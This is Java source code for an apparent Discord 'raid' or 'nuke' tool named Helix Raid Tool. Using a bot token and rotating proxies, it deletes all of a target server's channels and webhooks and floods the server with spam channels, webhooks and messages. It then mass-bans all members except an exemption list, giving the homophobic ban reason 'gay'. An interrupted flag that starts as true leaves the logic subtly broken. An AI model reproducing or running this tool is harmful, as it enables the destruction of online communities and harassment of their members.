
package bot;

import java.util.ArrayList;
import java.util.Arrays;
import java.util.List;
import java.util.Random;

import http.HttpRequest;

public class BotRaidFunc implements Runnable {
	private String token;
	private String proxies;
	private String sID;
	private String msgC;
	private String MBE;
	private boolean mb;

	public BotRaidFunc(final String token, final String proxies, final String sID, final String msgC, final String MBE,
			final boolean mb) {
		this.token = token;
		this.proxies = proxies;
		this.sID = sID;
		this.msgC = msgC;
		this.MBE = MBE;
		this.mb = mb;
	}

	@Override
	public void run() {

		// System.out.println(this.token + "\n" + this.proxies + "\n" + this.sID + "\n"
		// + this.msgC + "\n" + this.MBE);

		// identify to gateway (otherwise bot cannot send msg's)
		Runnable r = new BotGatewayIdentifier(this.token);
		final Thread t0 = new Thread(r);
		t0.start();
		boolean interrupted = true;
		// split proxy string (a big string separated by \n's) into array
		final String[] pArray = this.proxies.split("\n");
		// split mass ban exemption id's in the same way proxies are split
		final String[] MBEArray = this.MBE.split("\n");
		final String proxy = pArray[0];
		// split proxy ip and proxy port, then set proxy property
		String[] proxySplit = proxy.split(":");
		System.setProperty("http.proxyHost", proxySplit[0]);
		System.setProperty("http.proxyPort", proxySplit[1]);
		System.out.println("proxy property set");
		String res = null;

		// get all channels
		if (!Thread.interrupted() && !interrupted) {
			try {
				System.out.println("sending request");
				final HttpRequest rq = new HttpRequest("https://discord.com/api/v8/guilds/" + this.sID + "/channels",
						"utf-8", "GET");
				rq.addHeader("Content-Type", "application/json");
				rq.addHeader("Authorization", "Bot " + this.token);
				rq.setPostData(null);
				res = rq.finish();
				System.out.println(res);
			} catch (Exception e) {
				e.printStackTrace();
			}
		} else {
			interrupted = true;
		}

		// put channel id's in arraylist
		List<String> idArray = new ArrayList<String>();
		int idPos;
		int idEndpoint;
		for (int i = 0; i < res.length() && res.indexOf("\"id\"", i) != -1; i = idPos + 7 + idEndpoint) {
			idPos = res.indexOf("\"id\"", i);
			String idTemp = res.substring(idPos + 7);
			idEndpoint = idTemp.indexOf("\"");
			idTemp = idTemp.substring(0, idEndpoint);
			System.out.println(idTemp);
			idArray.add(idTemp);
		}

		// delete all channels in idArray
		for (int i = 0; i < idArray.size() && !interrupted; i++) {
			if (!Thread.interrupted()) {
				try {
					System.out.println("sending channel deletion request");
					final String chID = idArray.get(i);
					final HttpRequest rq = new HttpRequest("https://discord.com/api/v8/channels/" + chID, "utf-8",
							"DELETE");
					rq.addHeader("Content-Type", "application/json");
					rq.addHeader("Authorization", "Bot " + this.token);
					rq.setPostData(null);
					res = rq.finish();
					System.out.println(res);
				} catch (Exception e) {
					e.printStackTrace();
				}
			} else {
				interrupted = true;
			}
		}
		// new idArray for new channels being created
		idArray = new ArrayList<String>();
		for (int i = 0; i <= 30 && !interrupted; i++) {
			if (!Thread.interrupted()) {
				try {
					final Random rand = new Random();
					final String randProxy = pArray[rand.nextInt(pArray.length)];
					proxySplit = randProxy.split(":");
					System.setProperty("http.proxyHost", proxySplit[0]);
					System.setProperty("http.proxyPort", proxySplit[1]);
					System.out.println("proxy property set");
					System.out.println("sending request to make channel");
					final HttpRequest rq = new HttpRequest(
							"https://discord.com/api/v8/guilds/" + this.sID + "/channels", "utf-8", "POST");
					rq.addHeader("Content-Type", "application/json");
					rq.addHeader("Authorization", "Bot " + this.token);
					final String json = "{\"name\":\"EZZ Nuke by Helix Raid Tool\"}";
					rq.setPostData(json);
					res = rq.finish();
					System.out.println(res);
				} catch (Exception e) {
					e.printStackTrace();
				}
				for (int j = 0; j < res.length() && res.indexOf("\"id\"", j) != -1; j = idPos + 7 + idEndpoint) {
					idPos = res.indexOf("\"id\"", j);
					String idTemp = res.substring(idPos + 7);
					idEndpoint = idTemp.indexOf("\"");
					idTemp = idTemp.substring(0, idEndpoint);
					System.out.println(idTemp);
					idArray.add(idTemp);
				}
			} else {
				interrupted = true;
			}
		}

		// get all webhooks
		if (!Thread.interrupted() && !interrupted) {
			try {
				final HttpRequest rq = new HttpRequest("https://discord.com/api/v8/guilds/" + this.sID + "/webhooks",
						"utf-8", "GET");
				rq.addHeader("Content-Type", "application/json");
				rq.addHeader("Authorization", "Bot " + this.token);
				rq.setPostData(null);
				res = rq.finish();
				System.out.println(res);
			} catch (Exception e) {
				e.printStackTrace();
			}
		} else {
			interrupted = true;
		}
		// arraylist of webhook id's
		List<String> WHIDArray = new ArrayList<String>();
		int WHIDPos;
		int WHIDEndpoint;
		for (int i3 = 0; i3 < res.length() && res.indexOf("\"id\"", i3) != -1; i3 = WHIDPos + 7 + WHIDEndpoint) {
			WHIDPos = res.indexOf("\"id\"", i3);
			String WHIDTemp = res.substring(WHIDPos + 7);
			WHIDEndpoint = WHIDTemp.indexOf("\"");
			WHIDTemp = WHIDTemp.substring(0, WHIDEndpoint);
			System.out.println(WHIDTemp);
			WHIDArray.add(WHIDTemp);
		}
		// delete all webhooks in the arraylist
		for (int i = 0; i < WHIDArray.size() && !interrupted; i++) {
			if (!Thread.interrupted()) {
				try {
					final String WHID = WHIDArray.get(i);
					final HttpRequest rq = new HttpRequest("https://discord.com/api/v8/webhooks/" + WHID, "utf-8",
							"DELETE");
					rq.addHeader("Content-Type", "application/json");
					rq.addHeader("Authorization", "Bot " + this.token);
					rq.setPostData(null);
					res = rq.finish();
					System.out.println(res);
				} catch (Exception e) {
					e.printStackTrace();
				}
			} else {
				interrupted = true;
			}
		}

		// create new webhooks
		WHIDArray = new ArrayList<String>();
		final List<String> WHTokenArray = new ArrayList<String>();
		for (int l = 0; l < 10 && !interrupted; ++l) {
			final Random rand = new Random();
			final String randProxy = pArray[rand.nextInt(pArray.length)];
			proxySplit = randProxy.split(":");
			System.setProperty("http.proxyHost", proxySplit[0]);
			System.setProperty("http.proxyPort", proxySplit[1]);
			final String randID = idArray.get(rand.nextInt(idArray.size()));
			if (!Thread.interrupted()) {
				try {
					final HttpRequest rq = new HttpRequest(
							"https://discord.com/api/v8/channels/" + randID + "/webhooks", "utf-8", "POST");
					rq.addHeader("Content-Type", "application/json");
					rq.addHeader("Authorization", "Bot " + this.token);
					final String json = "{\"name\":\"EZ Webhook'd by Helix Raid Tool\"}";
					rq.setPostData(json);
					res = rq.finish();
					System.out.println(res);
				} catch (Exception e) {
					e.printStackTrace();
				}
			} else {
				interrupted = true;
			}

			// arraylists for webhooks id's and webhook tokens used together
			for (int i = 0; i < res.length()
					&& res.indexOf("\"type\": 1, \"id\"", i) != -1; i = WHIDPos + 7 + WHIDEndpoint) {
				WHIDPos = res.indexOf("\"type\": 1, \"id\"", i);
				String WHIDTemp = res.substring(WHIDPos + 18);
				WHIDEndpoint = WHIDTemp.indexOf("\"");
				WHIDTemp = WHIDTemp.substring(0, WHIDEndpoint);
				System.out.println(WHIDTemp);
				WHIDArray.add(WHIDTemp);
			}
			int WHTokenPos;
			int WHTokenEndpoint;
			for (int i = 0; i < res.length()
					&& res.indexOf("\"token\"", i) != -1; i = WHTokenPos + 7 + WHTokenEndpoint) {
				WHTokenPos = res.indexOf("\"token\"", i);
				String WHTokenTemp = res.substring(WHTokenPos + 10);
				WHTokenEndpoint = WHTokenTemp.indexOf("\"");
				WHTokenTemp = WHTokenTemp.substring(0, WHTokenEndpoint);
				System.out.println(WHTokenTemp);
				WHTokenArray.add(WHTokenTemp);
			}
		}

		// spam all webhooks
		r = null;
		r = new WebhookFlooder(WHIDArray, pArray, this.msgC, WHTokenArray, this.token, idArray);
		if (!Thread.interrupted() && !interrupted) {
			final Thread t2 = new Thread(r);
			final Thread t3 = new Thread(r);
			final Thread t4 = new Thread(r);
			t2.start();
			t3.start();
			t4.start();
		} else {
			interrupted = true;
		}
		if (!Thread.interrupted() && !interrupted) {
			r = new BotMsgFlooder(this.token, this.msgC, idArray, pArray);
			final Thread t5 = new Thread(r);
			final Thread t6 = new Thread(r);
			final Thread t7 = new Thread(r);
			t5.start();
			t6.start();
			t7.start();
		} else {
			interrupted = true;
		}
		try {
			Thread.sleep(10000L);
		} catch (InterruptedException e) {
			e.printStackTrace();
		}

		// get all server members
		if (!Thread.interrupted() && !interrupted && mb) {
			try {
				final HttpRequest rq = new HttpRequest(
						"https://discord.com/api/v8/guilds/" + this.sID + "/members?limit=1000", "utf-8", "GET");
				rq.addHeader("Content-Type", "application/json");
				rq.addHeader("Authorization", "Bot " + this.token);
				rq.setPostData(null);
				res = rq.finish();
				System.out.println(res);
			} catch (Exception e7) {
				e7.printStackTrace();
			}
		} else {
			interrupted = true;
		}
		// arraylist of all members
		final List<String> userArray = new ArrayList<String>();
		int userPos;
		int userEndpoint;
		for (int i = 0; i < res.length() && res.indexOf("\"id\"", i) != -1; i = userPos + 7 + userEndpoint) {
			userPos = res.indexOf("\"id\"", i);
			String userTemp = res.substring(userPos + 7);
			userEndpoint = userTemp.indexOf("\"");
			userTemp = userTemp.substring(0, userEndpoint);
			System.out.println(userTemp);
			userArray.add(userTemp);
		}
		// ban all members
		if (!Thread.interrupted() && !interrupted && mb) {
			for (int i = 0; i < userArray.size(); i++) {
				try {
					final String uID = userArray.get(i);
					if (!Arrays.asList(MBEArray).contains(uID)) {
						System.out.println("sending member ban request");
						final HttpRequest rq = new HttpRequest(
								"https://discord.com/api/v8/guilds/" + this.sID + "/bans/" + uID, "utf-8", "PUT");
						rq.addHeader("Content-Type", "application/json");
						rq.addHeader("Authorization", "Bot " + this.token);
						final String json = "{\"delete_message_days\":\"0\",\"reason\":\"gay\"}";
						rq.setPostData(json);
						res = rq.finish();
						System.out.println(res);
					}
				} catch (Exception e) {
					e.printStackTrace();
				}
			}
		} else {
			interrupted = true;
		}
		System.out.println("Thread Finished");
	}
}
